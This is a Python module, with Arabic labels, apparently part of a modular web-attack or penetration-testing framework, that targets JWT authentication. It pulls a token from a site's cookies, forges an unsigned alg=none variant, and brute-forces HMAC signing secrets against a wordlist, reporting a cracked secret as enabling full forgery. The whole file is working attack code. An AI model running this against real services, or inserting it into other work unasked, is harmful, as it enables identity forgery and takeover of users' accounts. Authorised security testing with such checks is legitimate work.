# jwt.py — هجمات JWT
import base64, json, hashlib, hmac as hm, re, time
from core.registry import module
from core.http import get
from core.wordlists import JWT_SECRETS
from core.helpers import load_list

@module("jwt", "auth", "تحليل وهجوم JWT")
def run(base, a, R):
    tok = getattr(a, "token", None)
    if not tok:
        _, h, _ = get(base + "/")
        m = re.search(r"(?:token|jwt)=([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)", h.get("set-cookie",""))
        if m: tok = m.group(1)
    if not tok: R.info("لا JWT — مرر --token"); return
    try: hdr, pay, sig = tok.split(".")
    except ValueError: R.warn("ليس JWT صالح"); return
    def b64u(s):
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s)
    try:
        hd = json.loads(b64u(hdr)); pd = json.loads(b64u(pay))
    except Exception:
        R.warn("تعذر فك JWT"); return
    R.good("Header: " + json.dumps(hd)); R.good("Payload: " + json.dumps(pd))
    if pd.get("exp") and time.time() > pd["exp"]: R.warn("التوكن منتهي")
    if hd.get("alg") == "none":
        R.vuln("alg=none — تزوير الهوية بدون توقيع!")
    else:
        nh = {k: v for k, v in hd.items() if k != "alg"}; nh["alg"] = "none"
        forged = base64.urlsafe_b64encode(json.dumps(nh).encode()).rstrip(b"=").decode() + "." + \
                 base64.urlsafe_b64encode(json.dumps(pd).encode()).rstrip(b"=").decode() + "."
        R.warn("اختبر alg=none: " + forged[:100] + "...")
    if hd.get("alg","").upper().startswith("HS"):
        secs = load_list(getattr(a, "wordlist", "") or "") if getattr(a, "wordlist", None) else JWT_SECRETS
        msg = f"{hdr}.{pay}".encode()
        for sec in secs:
            dg = hm.new(sec.encode(), msg, hashlib.sha256).digest()
            if base64.urlsafe_b64encode(dg).rstrip(b"=").decode() == sig:
                R.vuln(f"JWT secret مكسور: {sec} — تزوير كامل!")
                return
        R.info("لم يُكسر المفتاح بالقائمة")
